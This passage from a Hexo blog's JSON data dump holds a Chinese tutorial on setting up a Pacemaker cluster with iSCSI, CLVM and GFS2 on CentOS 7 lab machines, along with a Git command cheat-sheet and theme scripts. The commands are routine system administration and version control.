src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<h3 id=\"基本信息\"><a href=\"#基本信息\" class=\"headerlink\" title=\"基本信息\"></a>基本信息</h3><table>\n<thead>\n<tr>\n<th align=\"center\">主机名</th>\n<th align=\"center\">身份</th>\n<th align=\"center\">网络接口</th>\n<th align=\"center\">连接模式</th>\n<th align=\"center\">IP地址</th>\n</tr>\n</thead>\n<tbody><tr>\n<td align=\"center\">web3</td>\n<td align=\"center\">web服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.82&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">web4</td>\n<td align=\"center\">web服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.83&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">storage1</td>\n<td align=\"center\">iscsi存储服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.41&#x2F;24</td>\n</tr>\n<tr>\n<td align=\"center\">storage2</td>\n<td align=\"center\">iscsi存储服务器</td>\n<td align=\"center\">ens224</td>\n<td align=\"center\">仅主机</td>\n<td align=\"center\">10.8.7.42&#x2F;24</td>\n</tr>\n</tbody></table>\n<h3 id=\"项目说明\"><a href=\"#项目说明\" class=\"headerlink\" title=\"项目说明\"></a>项目说明</h3><p>在本项目中，主要完成以下任务：</p>\n<ol>\n<li>完成gfs1和gfs2关于ISCSI存储服务器的搭建，并且成功挂载到web1和web2主机。</li>\n</ol>","more":"<ol start=\"2\">\n<li><p>建立web1和web2主机的集群关系。</p>\n</li>\n<li><p>挂载GFS文件系统。</p>\n</li>\n<li><p>配置集群资源。</p>\n</li>\n<li><p>创建CLVM。</p>\n</li>\n<li><p>挂载共享存储。</p>\n</li>\n</ol>\n<h3 id=\"准备环境\"><a href=\"#准备环境\" class=\"headerlink\" title=\"准备环境\"></a>准备环境</h3><ul>\n<li><p>Centos7版本的虚拟机，Centos8版本的没有找到资料，还在自我探索的过程中。等待后期的更新吧。</p>\n</li>\n<li><p>虚拟机关闭SELINUX。</p>\n</li>\n<li><p>虚拟机关闭防火墙。</p>\n</li>\n<li><p>虚拟机关闭NetworkManager。</p>\n</li>\n<li><p>编写<code>/etc/hosts</code>文件，这个可选，我是为了后期配置方便，才写这样一个文件。</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">127.0.0.1   localhost localhost.localdomain localhost4 localhost4.localdomain4</span><br><span class=\"line\">::1         localhost localhost.localdomain localhost6 localhost6.localdomain6</span><br><span class=\"line\">10.8.7.82   web3.liuxp.com</span><br><span class=\"line\">10.8.7.83   web4.liuxp.com</span><br><span class=\"line\">10.8.7.41   storage1.liuxp.com</span><br><span class=\"line\">10.8.7.42   storage2.liuxp.com</span><br></pre></td></tr></table></figure>\n\n<p>如果你也打算用这个，编辑完之后可以使用scp命令直接拷贝到别的主机。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">scp /etc/hosts 10.8.7.42:/etc/</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"项目实施\"><a href=\"#项目实施\" class=\"headerlink\" title=\"项目实施\"></a>项目实施</h3><ul>\n<li><p>一定要按照顺序来做。</p>\n</li>\n<li><p>关于ISCSI服务器创建和挂载到客户端的操作，具体搭建过程可以看<a href=\"https://nustarain.gitee.io/2023/07/04/ISCSI/\">搭建并挂载ISCSI存储服务器</a>这篇文章，本文章不在赘述。对于我这个项目，两台ISCSI存储器都各自提供了一块磁盘，并且在两台web服务器都实现了挂载，storage1提供的ISCSI存储映射到web服务器上是<code>/dev/sdb</code>，storage2提供的ISCSI存储映射到web服务器上是<code>/dev/sdc</code>。</p>\n</li>\n<li><p>我接下来讲的“两台虚拟机”是指web3和web4，“任意一台虚拟机”是指web3或者web4其中的任意一台。</p>\n</li>\n<li><p>下载软件，两台虚拟机都需要做的</p>\n</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum -y install pacemaker pcs</span><br><span class=\"line\">systemctl start pcsd</span><br><span class=\"line\">systemctl <span class=\"built_in\">enable</span> pcsd</span><br><span class=\"line\"><span class=\"built_in\">echo</span> <span class=\"string\">&quot;q&quot;</span> | passwd --stdin hacluster</span><br></pre></td></tr></table></figure>\n\n<p>这块的意思是下载了pcsd服务，开启并设置自启动，安装这个服务会再系统创建一个<code>hacluster</code>用户，后面要用，要先给他改个密码。</p>\n<ul>\n<li>集群建立免认证，在集群任意一台机器做就可以</li>\n</ul>\n<p>说白一点，就是web3生成公钥私钥，然后把公钥发给web4，或者web4生成公钥私钥，然后把公钥发给web3。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">ssh-keygen</span><br><span class=\"line\">ssh-copy-id -i /root/.ssh/id_rsa.pub web4.liuxp.com</span><br></pre></td></tr></table></figure>\n\n<p>上面的命令是以web3举的例子。</p>\n<ul>\n<li>搭建集群，两台虚拟机都需要做的</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcs cluster auth web3.liuxp.com web4.liuxp.com</span><br><span class=\"line\">Username: hacluster</span><br><span class=\"line\">Password:q</span><br><span class=\"line\">node3: Authorized</span><br><span class=\"line\">node4: Authorized</span><br><span class=\"line\">pcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com</span><br><span class=\"line\">pcs cluster setup --name nginx_cluster web3.liuxp.com web4.liuxp.com --force <span class=\"comment\"># 如果报错就强制执行进行覆盖</span></span><br><span class=\"line\">pcs cluster start</span><br><span class=\"line\">pcs cluster status</span><br><span class=\"line\">pcs cluster <span class=\"built_in\">enable</span> --all</span><br><span class=\"line\">pcs status corosync</span><br></pre></td></tr></table></figure>\n\n<p>一般情况下如果第一次创建集群，上面命令可以直接创建成功，如果不是第一次创建，就需要加<code>--force</code>选项强制覆盖。等到所有信息都success，下面的集群开启，查看状态，设置自启动都不会出现什么问题的。</p>\n<p>如果第一次集群出现了什么问题，打算重新做，可以通过下面的这个命令摧毁集群，然后再强制建立集群。</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcs cluster destroy</span><br></pre></td></tr></table></figure>\n\n<ul>\n<li>挂载GFS文件系统，两台虚拟机都需要做的</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">yum install -y lvm2-cluster gfs2-utils fence-agents-all</span><br><span class=\"line\">lvmconf --enable-cluster</span><br><span class=\"line\">modprobe gfs2</span><br><span class=\"line\">lsmod | grep gfs2 </span><br></pre></td></tr></table></figure>\n\n<p>在进行完最后一步之后，如果出现一些看不懂的内容就说明，GFS文件系统已经挂载到这个系统上了，可以使用它进行格式化磁盘了。</p>\n<ul>\n<li>配置集群资源，在集群任意一台机器做就可以</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pcs property <span class=\"built_in\">set</span> no-quorum-policy=ignore</span><br><span class=\"line\">pcs property <span class=\"built_in\">set</span> stonith-enabled=<span class=\"literal\">false</span></span><br><span class=\"line\"></span><br><span class=\"line\">pcs resource create dlm ocf:pacemaker:controld allow_stonith_disabled=<span class=\"literal\">true</span> op monitor interval=30s <span class=\"built_in\">clone</span> interleave=<span class=\"literal\">true</span> ordered=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">pcs resource create clvmd ocf:heartbeat:clvm op monitor interval=30s <span class=\"built_in\">clone</span> interleave=<span class=\"literal\">true</span> ordered=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\">pcs constraint order start dlm-clone <span class=\"keyword\">then</span> clvmd-clone</span><br><span class=\"line\">pcs constraint colocation add clvmd-clone with dlm-clone</span><br><span class=\"line\">pcs property <span class=\"built_in\">set</span> no-quorum-policy=freeze</span><br></pre></td></tr></table></figure>\n\n<p>这块是没有个性化的，可以直接无脑<kbd>Ctrl</kbd>+<kbd>C</kbd>和<kbd>Ctrl</kbd>+<kbd>V</kbd></p>\n<ul>\n<li>创建CLVM，在集群任意一台机器做就可以</li>\n</ul>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">pvcreate /dev/sdb</span><br><span class=\"line\">pvcreate /dev/sdc</span><br><span class=\"line\">vgcreate -cy qavg /dev/sdb /dev/sdc</span><br><span class=\"line\">lvcreate -L 12G -n qa qavg</span><br></pre></td></tr></table></figure>\n\n<p>这里命令的具体含义如果不懂，可以看我的<a href=\"https://nustarain.gitee.io/2023/07/04/LVM/\">关于LVM的配置</a>的文章。</p>\n<ul>\n<li>挂载实现共享存储</li>\n</ul>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># 格式化文件系统，在集群任意一台机器做就可以</span></span><br><span class=\"line\">mkfs.gfs2 -p lock_dlm -t nginx_cluster:gfs2 -j 2 /dev/qavg/qa</span><br><span class=\"line\"><span class=\"comment\"># 创建挂载点，两台虚拟机都需要做的</span></span><br><span class=\"line\"><span class=\"built_in\">mkdir</span> /mnt/cluster</span><br><span class=\"line\"><span class=\"comment\"># 要实现自动挂载，在集群任意一台机器做就可以</span></span><br><span class=\"line\">pcs resource create fs_gfs2 Filesystem device=<span class=\"string\">&quot;/dev/qavg/qa&quot;</span> directory=<span class=\"string\">&quot;/mnt/cluster&quot;</span> fstype=<span class=\"string\">&quot;gfs2&quot;</span> options=<span class=\"string\">&quot;noatime,nodiratime&quot;</span> op monitor interval=10s <span class=\"built_in\">clone</span> interleave=<span class=\"literal\">true</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 给集群资源设置启动顺序</span></span><br><span class=\"line\">pcs constraint order start clvmd-clone <span class=\"keyword\">then</span> fs_gfs2-clone</span><br><span class=\"line\">pcs constraint colocation add fs_gfs2-clone with clvmd-clone</span><br><span class=\"line\">pcs constraint show</span><br><span class=\"line\"><span class=\"built_in\">df</span></span><br></pre></td></tr></table></figure>\n\n<p>最后<code>df</code>如果看到自己创建的逻辑卷<code>/dev/qavg/qa</code>，就说明挂载成功了，可以通过向挂载点里面写入文件来使用存储了。</p>"},{"title":"Git 的基本操作","date":"2023-03-13T04:00:00.000Z","_content":"\n添加修改到暂存区\n\n```git\ngit add .\n```\n\n添加提交说明\n\n```git\ngit commit -m \"modify file1\"\n```\n\n把本地修改推送到远程仓库\n\n<!-- more -->\n\n```git \ngit push origin main\n```\n>PS：main 代表是远程分支的名字，远程分支叫什么就填什么。\n\n克隆仓库\n\n```git \ngit clone \"your link\"\n```\n>PS：克隆下来的仓库和下载下来的源代码解压出来的效果是不一样的，最直接的不同是：克隆会产生一个隐藏的.git 文件，而解压不会产生这个文件。\n\n同步远程分支\n\n```git\ngit pull\n```\n\n删除push和fetch地址\n\n```git \ngit remote rm origin\n```\n\n添加push和fetch地址\n\n```git\ngit remote add origin\n```\n\n列出所有的分支(包括本地分支和远程分支)\n\n```git\ngit branch -a\n```\n\n在本地切换分支\n\n```git \ngit checkout \"branch name\"\n```\n\n在本地创建分支\n\n```git \ngit checkout -b \"branch name\"\n```\n\n>PS：这个命令在创建分支的同时也会将当前分支切换过去\n\n修改本地分支名字\n\n```git \ngit branch -m \"old branch name\" \"new branch name\"\n```\n\n删除本地分支\n\n```git\ngit branch -d \"branch name\"\n```\n\n删除远程分支\n\n```git \ngit push origin --delete \"remote branch name\"\n```","source":"_posts/git-basic-operation.md","raw":"---\ntitle: Git 的基本操作\ndate: 2023-03-13 12:00:00\ncategories: 探索\ntags: \n  - Git\n---\n\n添加修改到暂存区\n\n```git\ngit add .\n```\n\n添加提交说明\n\n```git\ngit commit -m \"modify file1\"\n```\n\n把本地修改推送到远程仓库\n\n<!-- more -->\n\n```git \ngit push origin main\n```\n>PS：main 代表是远程分支的名字，远程分支叫什么就填什么。\n\n克隆仓库\n\n```git \ngit clone \"your link\"\n```\n>PS：克隆下来的仓库和下载下来的源代码解压出来的效果是不一样的，最直接的不同是：克隆会产生一个隐藏的.git 文件，而解压不会产生这个文件。\n\n同步远程分支\n\n```git\ngit pull\n```\n\n删除push和fetch地址\n\n```git \ngit remote rm origin\n```\n\n添加push和fetch地址\n\n```git\ngit remote add origin\n```\n\n列出所有的分支(包括本地分支和远程分支)\n\n```git\ngit branch -a\n```\n\n在本地切换分支\n\n```git \ngit checkout \"branch name\"\n```\n\n在本地创建分支\n\n```git \ngit checkout -b \"branch name\"\n```\n\n>PS：这个命令在创建分支的同时也会将当前分支切换过去\n\n修改本地分支名字\n\n```git \ngit branch -m \"old branch name\" \"new branch name\"\n```\n\n删除本地分支\n\n```git\ngit branch -d \"branch name\"\n```\n\n删除远程分支\n\n```git \ngit push origin --delete \"remote branch name\"\n```","slug":"git-basic-operation","published":1,"updated":"2024-05-03T03:55:54.853Z","comments":1,"layout":"post","photos":[],"link":"","_id":"clvq6s5fm005q7zj3akgrb0xl","content":"<link rel=\"stylesheet\" class=\"aplayer-secondary-style-marker\" href=\"/assets/css/APlayer.min.css\"><script src=\"/assets/js/APlayer.min.js\" class=\"aplayer-secondary-script-marker\"></script><script class=\"meting-secondary-script-marker\" src=\"/assets/js/Meting.min.js\"></script><p>添加修改到暂存区</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br></pre></td></tr></table></figure>\n\n<p>添加提交说明</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -m &quot;modify file1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>把本地修改推送到远程仓库</p>\n<span id=\"more\"></span>\n\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin main</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>PS：main 代表是远程分支的名字，远程分支叫什么就填什么。</p>\n</blockquote>\n<p>克隆仓库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone &quot;your link&quot;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>PS：克隆下来的仓库和下载下来的源代码解压出来的效果是不一样的，最直接的不同是：克隆会产生一个隐藏的.git 文件，而解压不会产生这个文件。</p>\n</blockquote>\n<p>同步远程分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git pull</span><br></pre></td></tr></table></figure>\n\n<p>删除push和fetch地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote rm origin</span><br></pre></td></tr></table></figure>\n\n<p>添加push和fetch地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add origin</span><br></pre></td></tr></table></figure>\n\n<p>列出所有的分支(包括本地分支和远程分支)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n\n<p>在本地切换分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout &quot;branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<p>在本地创建分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout -b &quot;branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>PS：这个命令在创建分支的同时也会将当前分支切换过去</p>\n</blockquote>\n<p>修改本地分支名字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -m &quot;old branch name&quot; &quot;new branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<p>删除本地分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d &quot;branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<p>删除远程分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin --delete &quot;remote branch name&quot;</span><br></pre></td></tr></table></figure>","site":{"data":{"APlayer":"{% if aplayer.enabled %}\n  <!-- require APlayer -->\n  <link rel=\"stylesheet\" href=\"{{aplayer.cdn.css}}\">\n  <script src=\"{{aplayer.cdn.js}}\"></script>\n  <!-- require MetingJS -->\n  <script src=\"{{aplayer.cdn.meting}}\"></script>\n  <meting-js\n    server=\"{{aplayer.server}}\"\n    type=\"{{aplayer.type}}\"\n    fixed=\"{{aplayer.fixed}}\"\n    id=\"{{aplayer.id}}\"\n    auto=\"{{aplayer.auto}}\"\n    mini=\"{{aplayer.mini}}\"\n    autoplay=\"{{aplayer.autoplay}}\"\n    theme=\"{{aplayer.theme}}\"\n    loop=\"{{aplayer.loop}}\"\n    order=\"{{aplayer.order}}\"\n    preload=\"{{aplayer.preload}}\"\n    volume=\"{{aplayer.volume}}\"\n    mutex=\"{{aplayer.mutex}}\"\n    list-folded=\"{{aplayer.listfolded}}\"\n    list-max-height=\"{{aplayer.listmaxheight}}\"\n    storage-name=\"{{aplayer.storagename}}\" >\n  </meting-js>\n{% endif %}","body-end":"<script>\n  document.addEventListener(\"DOMContentLoaded\", function() {\n    // 查找所有 div.table-container 元素\n    const tableContainers = document.querySelectorAll(\".table-container\");\n\n    // 遍历所有 div.table-container 元素\n    tableContainers.forEach(function(tableContainer) {\n      // 获取 div.table-container 内的 span 元素数量\n      const spanCount = tableContainer.querySelectorAll(\"tbody > tr > td.code > pre > span\").length;\n\n      // 检查 span 元素数量是否 >= 3\n      if (spanCount >= 11) {\n        // 检查 div.table-container 前面是否有 figcaption 元素，如果没有则添加一个\n        const prevElement = tableContainer.previousElementSibling;\n        let figcaption;\n        let iElement;\n        if (!prevElement || prevElement.tagName.toLowerCase() !== \"figcaption\") {\n          // 在 div.table-container 前插入一个 figcaption 元素\n          figcaption = document.createElement(\"figcaption\");\n\n          // 将 figcaption 插入到 DOM 中\n          tableContainer.parentNode.insertBefore(figcaption, tableContainer);\n        } else {\n          figcaption = prevElement;\n        }\n\n        // 创建一个 <i> 标签并添加功能\n        iElement = document.createElement(\"i\");\n        iElement.className = \"fas fa-angle-down\";\n        // 插入一点空格\n        iElement.innerHTML = \"&nbsp;&nbsp;&nbsp;\";\n        figcaption.insertBefore(iElement, figcaption.firstChild);\n\n        // 为 <i> 标签添加点击事件\n        iElement.addEventListener(\"click\", function() {\n          // 切换 tableContainer 的 \"code-hidden\" 类\n          tableContainer.classList.toggle(\"code-hidden\");\n\n          // 切换 <i> 标签的类名\n          if (iElement.classList.contains(\"fa-angle-down\")) {\n            iElement.classList.remove(\"fa-angle-down\");\n            iElement.classList.add(\"fa-angle-right\");\n          } else {\n            iElement.classList.remove(\"fa-angle-right\");\n            iElement.classList.add(\"fa-angle-down\");\n          }\n        });\n      }\n    });\n  });\n</script>","footer":"<script color=\"107,194,53\" opacity=\"1.0\" zIndex=\"-1\" count=\"99\" src=\"https://cdn.jsdelivr.net/npm/canvas-nest.js@1/dist/canvas-nest.js\"></script>","styles":"body {\n  background: url(\"/images/sky.jpg\");\n  background-repeat: no-repeat;\n  background-attachment: fixed;\n  background-size: cover;\n  background-position: 100% 100%;\n}\n.posts-expand .post-meta-container {\n  color: #eeb422;\n}\n.header-inner {\n  background: rgba(238,180,34,0.7);\n}\n.popup {\n  opacity: 1;\n}\n.main-inner {\n  background-color: rgba(255,255,255,0);\n  padding: 0px 40px 40px 40px;\n}\n/* 代码块隐藏 */\n.code-hidden {\n  display: none;\n}\n","variables":""}},"excerpt":"<p>添加修改到暂存区</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git add .</span><br></pre></td></tr></table></figure>\n\n<p>添加提交说明</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git commit -m &quot;modify file1&quot;</span><br></pre></td></tr></table></figure>\n\n<p>把本地修改推送到远程仓库</p>","more":"<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin main</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>PS：main 代表是远程分支的名字，远程分支叫什么就填什么。</p>\n</blockquote>\n<p>克隆仓库</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git clone &quot;your link&quot;</span><br></pre></td></tr></table></figure>\n<blockquote>\n<p>PS：克隆下来的仓库和下载下来的源代码解压出来的效果是不一样的，最直接的不同是：克隆会产生一个隐藏的.git 文件，而解压不会产生这个文件。</p>\n</blockquote>\n<p>同步远程分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git pull</span><br></pre></td></tr></table></figure>\n\n<p>删除push和fetch地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote rm origin</span><br></pre></td></tr></table></figure>\n\n<p>添加push和fetch地址</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git remote add origin</span><br></pre></td></tr></table></figure>\n\n<p>列出所有的分支(包括本地分支和远程分支)</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -a</span><br></pre></td></tr></table></figure>\n\n<p>在本地切换分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout &quot;branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<p>在本地创建分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git checkout -b &quot;branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<blockquote>\n<p>PS：这个命令在创建分支的同时也会将当前分支切换过去</p>\n</blockquote>\n<p>修改本地分支名字</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -m &quot;old branch name&quot; &quot;new branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<p>删除本地分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git branch -d &quot;branch name&quot;</span><br></pre></td></tr></table></figure>\n\n<p>删除远程分支</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">git push origin --delete &quot;remote branch name&quot;</span><br></pre></td></tr></table></figure>"},{"title":"Git 拒绝合并无关历史","date":"2023-03-26T14:46:29.000Z","_content":"\n### 问题描述\n\n可能是因为经常在两台电脑上开发的缘故吧，之间来回倒腾。在windows上开发了一些东西，又回到Ubuntu后，就应该是先进行git pull。没错，就应该是这样，然而在我进行git pull时，所有的进度都进行完成之后，出现了以下的报错。\n\n<!-- more -->\n\n```bash 折叠代码\n提示：您有偏离的分支，需要指定如何调和它们。您可以在执行下一次\n提示：pull 